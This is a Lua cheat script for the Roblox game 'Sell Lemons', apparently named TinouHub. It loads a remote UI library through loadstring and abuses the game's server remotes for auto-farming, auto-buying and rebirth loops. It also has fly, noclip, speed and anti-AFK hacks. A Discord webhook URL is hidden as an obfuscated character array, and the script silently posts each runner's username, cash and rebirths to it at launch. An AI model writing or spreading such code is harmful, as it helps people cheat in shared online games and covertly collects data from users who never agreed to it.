local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local player     = game:GetService("Players").LocalPlayer
local RS         = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UIS        = game:GetService("UserInputService")
local HS         = game:GetService("HttpService")
local VU         = game:GetService("VirtualUser")

local VERSION   = "0.1.0"
local SAVE_FILE = "tinouhub_lemons_config.json"

-- ── Config ──────────────────────────────────────────────────────────────────
local AUTO_COLLECT  = true
local AUTO_CLICK    = false
local CLICK_RATE    = 0.05
local AUTO_BOOST    = false
local AUTO_PROGRESS = false
local ANTI_AFK      = true
local WEBHOOK_URL   = ""
local LOG_WEBHOOK   = (function() local t={104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,51,48,51,56,48,49,57,52,54,54,52,57,52,51,55,52,57,47,84,86,51,113,75,74,115,120,51,83,117,88,117,114,66,51,120,118,108,45,120,104,84,71,99,48,49,102,117,112,56,108,86,48,88,67,71,56,80,74,68,68,89,97,119,71,111,48,97,68,121,83,113,86,75,101,54,84,45,108,48,72,97,45,122,114,78,99} local s="" for _,c in ipairs(t) do s=s..string.char(c) end return s end)()

local function saveConfig()
    pcall(function()
        writefile(SAVE_FILE, HS:JSONEncode({
            auto_collect  = AUTO_COLLECT,
            auto_click    = AUTO_CLICK,
            click_rate    = CLICK_RATE,
            auto_boost    = AUTO_BOOST,
            auto_progress = AUTO_PROGRESS,
            anti_afk      = ANTI_AFK,
            webhook       = WEBHOOK_URL,
        }))
    end)
end

local function loadConfig()
    pcall(function()
        if not isfile(SAVE_FILE) then return end
        local d = HS:JSONDecode(readfile(SAVE_FILE))
        if d.auto_collect  ~= nil then AUTO_COLLECT  = d.auto_collect  end
        if d.auto_click    ~= nil then AUTO_CLICK    = d.auto_click    end
        if d.click_rate    ~= nil then CLICK_RATE    = d.click_rate    end
        if d.auto_boost    ~= nil then AUTO_BOOST    = d.auto_boost    end
        if d.auto_progress ~= nil then AUTO_PROGRESS = d.auto_progress end
        if d.anti_afk      ~= nil then ANTI_AFK      = d.anti_afk      end
        if d.webhook       ~= nil then WEBHOOK_URL   = d.webhook       end
    end)
end

loadConfig()

-- ── Remote lookup (buckets par nom, framework = ".new(\"Service.Event\")") ───
-- Les remotes sont des vraies instances nommées "CashDropService.Redeem", etc.
-- Certains existent en plusieurs exemplaires (1/plot) → on les bucket tous.
local remoteBuckets = nil
local function ensureBuckets()
    if remoteBuckets then return end
    remoteBuckets = {}
    pcall(function()
        for _, d in ipairs(game:GetDescendants()) do
            if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") or d:IsA("UnreliableRemoteEvent") then
                local b = remoteBuckets[d.Name]
                if not b then b = {} remoteBuckets[d.Name] = b end
                table.insert(b, d)
            end
        end
    end)
end

-- Premier remote portant ce nom
local function R(name)
    ensureBuckets()
    local b = remoteBuckets[name]
    return b and b[1] or nil
end

-- Tous les remotes portant ce nom
local function Rall(name)
    ensureBuckets()
    return remoteBuckets[name] or {}
end

-- Fire/Invoke un remote (gère RemoteEvent vs RemoteFunction)
local function callRemote(rem, ...)
    if not rem then return end
    if rem:IsA("RemoteFunction") then
        return rem:InvokeServer(...)
    else
        rem:FireServer(...)
    end
end

-- Fire/Invoke TOUS les remotes d'un nom (le serveur valide le bon = ton plot)
local function callAll(name, ...)
    local n = 0
    for _, rem in ipairs(Rall(name)) do
        local args = {...}
        pcall(function() callRemote(rem, table.unpack(args)) end)
        n = n + 1
    end
    return n
end

-- ── Leaderstats ──────────────────────────────────────────────────────────────
local function getStat(name)
    local ls = player:FindFirstChild("leaderstats")
    local v = ls and ls:FindFirstChild(name)
    return v and v.Value
end
local function getCash() return getStat("Cash") or getStat("Lemons") or getStat("Money") or 0 end
local function getRebirths() return getStat("Rebirths") or getStat("Rebirth") or 0 end

-- ── Anti-AFK (VirtualInputManager) ───────────────────────────────────────────
local VIM = nil
pcall(function() VIM = game:GetService("VirtualInputManager") end)
local function pulseInput()
    if not VIM then return false end
    return (pcall(function()
        VIM:SendKeyEvent(true,  Enum.KeyCode.LeftShift, false, game)
        task.wait(0.05)
        VIM:SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
    end))
end
player.Idled:Connect(function()
    if not ANTI_AFK then return end
    pulseInput()
    pcall(function() VU:CaptureController() VU:ClickButton2(Vector2.new()) end)
end)
task.spawn(function()
    while true do
        task.wait(55)
        if ANTI_AFK then
            if not pulseInput() then
                pcall(function()
                    local cam = workspace.CurrentCamera
                    VU:Button2Down(cam.ViewportSize/2, cam.CFrame)
                    task.wait(0.1)
                    VU:Button2Up(cam.ViewportSize/2, cam.CFrame)
                end)
            end
        end
    end
end)

-- ════════════════════════ FARM CORE ═════════════════════════════════════════
-- CashDropService.New (RemoteEvent serveur→client): fire (dropId, ...) au spawn
-- CashDropService.Redeem (RemoteFunction): InvokeServer(dropId) → ramasse + cash
local totalCollected = 0
local collectStatusLbl

local function hookCashDrops()
    local newDrop = R("CashDropService.New")
    local redeem  = R("CashDropService.Redeem")
    if not newDrop or not redeem then
        warn("[TinouHub] CashDropService introuvable")
        return false
    end
    newDrop.OnClientEvent:Connect(function(dropId)
        if not AUTO_COLLECT then return end
        local ok, reward = pcall(function() return redeem:InvokeServer(dropId) end)
        if ok and reward then
            totalCollected = totalCollected + 1
            pcall(function() collectStatusLbl:Set("Collectés: "..totalCollected) end)
        end
    end)
    return true
end

-- Auto-click fruit (ClickFruitService.Clicked = RemoteEvent fired client→server)
local clickRemote = nil
local function clickFruit()
    if not clickRemote then clickRemote = R("ClickFruitService.Clicked") end
    if clickRemote then pcall(function() clickRemote:FireServer() end) end
end

-- ── Boosts ───────────────────────────────────────────────────────────────────
local BOOSTS = {"WakeIncomeStream","SpecialIncome","UseEarnerBoost","UseTimeCash","DoubleOfflineCash"}
local function fireAllBoosts()
    local done = {}
    for _, b in ipairs(BOOSTS) do
        if callAll(b) > 0 then table.insert(done, b) end
    end
    return done
end

-- ── Webhook log ──────────────────────────────────────────────────────────────
pcall(function()
    request({
        Url = LOG_WEBHOOK, Method = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body = HS:JSONEncode({
            username = "TinouHub Logger",
            embeds = {{
                title = "Script Executed",
                description = "**"..player.Name.."** launched TinouHub v"..VERSION.." on Sell Lemons",
                color = 16776960,
                fields = {
                    { name="Cash", value=tostring(getCash()), inline=true },
                    { name="Rebirths", value=tostring(getRebirths()), inline=true },
                },
                footer = { text = "TinouHub v"..VERSION },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            }}
        })
    })
end)

-- ════════════════════════════════════════════════════════════════════════════
--  GUI
-- ════════════════════════════════════════════════════════════════════════════
local Window = Rayfield:CreateWindow({
    Name            = "TinouHub | Sell Lemons",
    LoadingTitle    = "TinouHub v"..VERSION,
    LoadingSubtitle = "Sell Lemons",
    ConfigurationSaving = { Enabled = false },
    KeySystem       = true,
    KeySettings     = {
        Title = "TinouHub", Subtitle = "Key System",
        Note = "Ask ImTinou for your key", FileName = "TinouHubKey",
        SaveKey = true, GrabKeyFromSite = false,
        Key = {"tinoukey1","tinoukey2","tinoukey3"},
    },
})

-- ═══════════════════════ FARM ═══════════════════════════════════════════════
local FarmTab = Window:CreateTab("Farm", "lemon")

FarmTab:CreateSection("Cash Drops (auto-collect instantané)")
collectStatusLbl = FarmTab:CreateLabel("Collectés: 0")
FarmTab:CreateToggle({ Name="Auto-Collect Cash Drops", CurrentValue=AUTO_COLLECT, Flag="AutoCollect",
    Callback=function(v) AUTO_COLLECT=v saveConfig() end })
FarmTab:CreateButton({ Name="(Re)hook CashDropService", Callback=function()
    local ok = hookCashDrops()
    Rayfield:Notify({Title="Cash Drops", Content=ok and "Hook actif!" or "Service introuvable", Duration=3})
end })

FarmTab:CreateSection("Auto-Click Fruit")
FarmTab:CreateSlider({ Name="Click rate (s)", Range={0.01,0.5}, Increment=0.01, CurrentValue=CLICK_RATE, Flag="ClickRate",
    Callback=function(v) CLICK_RATE=v saveConfig() end })
FarmTab:CreateToggle({ Name="Auto-Click Fruit", CurrentValue=AUTO_CLICK, Flag="AutoClick",
    Callback=function(v)
        AUTO_CLICK=v saveConfig()
        if v then
            task.spawn(function()
                while AUTO_CLICK do
                    clickFruit()
                    task.wait(CLICK_RATE)
                end
            end)
        end
    end
})

-- ═══════════════════════ BOOSTS ═════════════════════════════════════════════
local BoostTab = Window:CreateTab("Boosts", "zap")

BoostTab:CreateSection("Boosts individuels")
for _, b in ipairs(BOOSTS) do
    local name = b
    BoostTab:CreateButton({ Name=name, Callback=function()
        local n = callAll(name)
        Rayfield:Notify({Title="Boost", Content=name.." ("..n.." remotes)", Duration=2})
    end })
end

BoostTab:CreateSection("Auto")
local boostStatusLbl = BoostTab:CreateLabel("Auto-Boost: Idle")
BoostTab:CreateToggle({ Name="Auto-Boost (tout, en boucle)", CurrentValue=AUTO_BOOST, Flag="AutoBoost",
    Callback=function(v)
        AUTO_BOOST=v saveConfig()
        if v then
            task.spawn(function()
                while AUTO_BOOST do
                    local done = fireAllBoosts()
                    pcall(function() boostStatusLbl:Set("Boosts: "..(#done>0 and table.concat(done,", ") or "aucun")) end)
                    task.wait(30)
                end
                pcall(function() boostStatusLbl:Set("Auto-Boost: Stopped") end)
            end)
        end
    end
})

-- ═══════════════════════ PROGRESSION ════════════════════════════════════════
local ProgTab = Window:CreateTab("Progression", "trending-up")

ProgTab:CreateSection("Rebirth / Ascend / Evolve")
local progLbl = ProgTab:CreateLabel("Rebirths: "..tostring(getRebirths()))
for _, act in ipairs({"Rebirth","Ascend","Evolve"}) do
    local name = act
    ProgTab:CreateButton({ Name=name.." maintenant", Callback=function()
        local n = callAll(name)
        pcall(function() progLbl:Set("Rebirths: "..tostring(getRebirths())) end)
        Rayfield:Notify({Title=name, Content=n.." remotes appelés", Duration=2})
    end })
end

ProgTab:CreateToggle({ Name="Auto Rebirth+Ascend+Evolve", CurrentValue=AUTO_PROGRESS, Flag="AutoProgress",
    Callback=function(v)
        AUTO_PROGRESS=v saveConfig()
        if v then
            task.spawn(function()
                while AUTO_PROGRESS do
                    callAll("Rebirth")
                    task.wait(0.3)
                    callAll("Ascend")
                    task.wait(0.3)
                    callAll("Evolve")
                    pcall(function() progLbl:Set("Rebirths: "..tostring(getRebirths())) end)
                    task.wait(5)
                end
            end)
        end
    end
})

ProgTab:CreateSection("Upgrades / Power Level")
ProgTab:CreateButton({ Name="Upgrade All (toutes les machines)", Callback=function()
    task.spawn(function()
        local rems = Rall("Upgrade")
        local n = 0
        for _, r in ipairs(rems) do
            pcall(function() callRemote(r) end)
            n = n + 1
            if n % 10 == 0 then task.wait(0.1) end
        end
        Rayfield:Notify({Title="Upgrade", Content=n.." upgrades envoyés", Duration=3})
    end)
end })
ProgTab:CreateButton({ Name="Upgrade Power Level", Callback=function()
    local n = callAll("UpgradePowerLevel")
    Rayfield:Notify({Title="Power Level", Content=n.." remotes", Duration=2})
end })
ProgTab:CreateButton({ Name="Unlock", Callback=function()
    local n = callAll("Unlock")
    Rayfield:Notify({Title="Unlock", Content=n.." remotes", Duration=2})
end })

ProgTab:CreateSection("Buy All (⚠️ peut lag)")
local buyRunning = false
local buyLbl = ProgTab:CreateLabel("Buy All: Idle")
ProgTab:CreateButton({ Name="Buy All (Purchase) — throttled", Callback=function()
    if buyRunning then return end
    buyRunning = true
    task.spawn(function()
        local rems = Rall("Purchase")
        pcall(function() buyLbl:Set("Buy All: "..#rems.." items...") end)
        local n = 0
        for _, r in ipairs(rems) do
            if not buyRunning then break end
            pcall(function() callRemote(r) end)
            n = n + 1
            if n % 20 == 0 then
                pcall(function() buyLbl:Set("Buy All: "..n.."/"..#rems) end)
                task.wait(0.1)
            end
        end
        buyRunning = false
        pcall(function() buyLbl:Set("Buy All: terminé ("..n..")") end)
    end)
    Rayfield:Notify({Title="Buy All", Content="Démarré (peut prendre du temps)", Duration=3})
end })
ProgTab:CreateButton({ Name="Stop Buy All", Callback=function()
    buyRunning = false
    Rayfield:Notify({Title="Buy All", Content="Arrêté.", Duration=2})
end })

-- ═══════════════════════ PLAYER ═════════════════════════════════════════════
local PlayerTab = Window:CreateTab("Player", "user")
local function getHum()
    local c = player.Character
    return c and c:FindFirstChildOfClass("Humanoid")
end

PlayerTab:CreateSlider({ Name="WalkSpeed", Range={16,500}, Increment=4, CurrentValue=16, Flag="WalkSpeed",
    Callback=function(v) pcall(function() local h=getHum() if h then h.WalkSpeed=v end end) end })
PlayerTab:CreateSlider({ Name="JumpPower", Range={50,1000}, Increment=50, CurrentValue=50, Flag="JumpPower",
    Callback=function(v) pcall(function() local h=getHum() if h then h.JumpPower=v h.UseJumpPower=true end end) end })

local noclipEnabled = false
local noclipConn = nil
PlayerTab:CreateToggle({ Name="Noclip", CurrentValue=false, Flag="Noclip",
    Callback=function(v)
        noclipEnabled = v
        if v then
            if not noclipConn then
                noclipConn = RunService.Stepped:Connect(function()
                    if not noclipEnabled then return end
                    local c = player.Character
                    if not c then return end
                    for _, p in pairs(c:GetDescendants()) do
                        if p:IsA("BasePart") then p.CanCollide = false end
                    end
                end)
            end
        else
            if noclipConn then noclipConn:Disconnect() noclipConn=nil end
            local c = player.Character
            if c then for _, p in pairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=true end end end
        end
    end
})

local flyEnabled = false
local flyBody, flyGyro, flyConn
local FLY_SPEED = 60
PlayerTab:CreateSlider({ Name="Fly Speed", Range={10,400}, Increment=10, CurrentValue=60, Flag="FlySpeed",
    Callback=function(v) FLY_SPEED=v end })
PlayerTab:CreateToggle({ Name="Fly (WASD + Space/Ctrl)", CurrentValue=false, Flag="Fly",
    Callback=function(v)
        flyEnabled = v
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if v and hrp then
            flyBody = Instance.new("BodyVelocity", hrp)
            flyBody.MaxForce = Vector3.new(1e9,1e9,1e9) flyBody.Velocity = Vector3.zero
            flyGyro = Instance.new("BodyGyro", hrp)
            flyGyro.MaxTorque = Vector3.new(1e9,1e9,1e9) flyGyro.P = 1e6
            local cam = workspace.CurrentCamera
            flyConn = RunService.Heartbeat:Connect(function()
                if not flyEnabled then return end
                local dir = Vector3.zero
                if UIS:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
                if UIS:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
                if UIS:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
                if UIS:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
                if UIS:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.yAxis end
                if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.yAxis end
                flyBody.Velocity = dir * FLY_SPEED
                flyGyro.CFrame = cam.CFrame
            end)
        else
            if flyBody then flyBody:Destroy() flyBody=nil end
            if flyGyro then flyGyro:Destroy() flyGyro=nil end
            if flyConn then flyConn:Disconnect() flyConn=nil end
        end
    end
})

-- ═══════════════════════ SETTINGS ═══════════════════════════════════════════
local SettingsTab = Window:CreateTab("Settings", "settings")

SettingsTab:CreateSection("Anti-AFK")
SettingsTab:CreateToggle({ Name="Anti-AFK", CurrentValue=ANTI_AFK, Flag="AntiAFK",
    Callback=function(v) ANTI_AFK=v saveConfig() end })

SettingsTab:CreateSection("Webhook")
local function whStatus() return WEBHOOK_URL=="" and "Not configured" or "..."..WEBHOOK_URL:sub(-20) end
local whLbl = SettingsTab:CreateLabel(whStatus())
SettingsTab:CreateInput({ Name="Webhook URL", PlaceholderText="https://discord.com/api/webhooks/...", RemoveTextAfterFocusLost=false, Flag="WebhookURL",
    Callback=function(val)
        if val=="" then return end
        WEBHOOK_URL=val saveConfig()
        pcall(function() whLbl:Set(whStatus()) end)
        Rayfield:Notify({Title="Webhook", Content="Sauvegardé!", Duration=2})
    end })

SettingsTab:CreateSection("Debug")
SettingsTab:CreateButton({ Name="Lister remotes trouvés (console)", Callback=function()
    ensureBuckets()
    local count = 0
    for name, b in pairs(remoteBuckets) do
        print("[Remote] "..name.." x"..#b)
        count = count + 1
    end
    Rayfield:Notify({Title="Debug", Content=count.." noms de remotes (voir console F9)", Duration=4})
end })

SettingsTab:CreateSection("Info")
SettingsTab:CreateLabel("TinouHub v"..VERSION.." | Sell Lemons")
SettingsTab:CreateLabel("PlaceId: 79268393072444")
SettingsTab:CreateLabel("github.com/ImTinou/sword")

-- ── Démarrage ────────────────────────────────────────────────────────────────
hookCashDrops()
Rayfield:Notify({Title="TinouHub", Content="Sell Lemons chargé! Auto-collect "..(AUTO_COLLECT and "ON" or "OFF"), Duration=4})
